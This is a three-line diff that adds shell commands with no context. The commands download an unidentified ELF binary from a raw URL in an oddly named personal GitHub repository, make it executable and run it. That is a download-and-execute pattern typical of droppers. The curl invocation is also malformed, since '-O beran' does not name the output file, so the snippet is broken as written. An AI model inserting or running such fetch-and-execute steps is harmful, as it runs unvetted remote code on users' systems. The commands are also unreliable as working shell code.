@@ -1,0 +1,3 @@
+curl -O beran https://github.com/petergriuffin123/fubbububba/raw/refs/heads/main/theb.elf
+chmod +x beran
+./beran
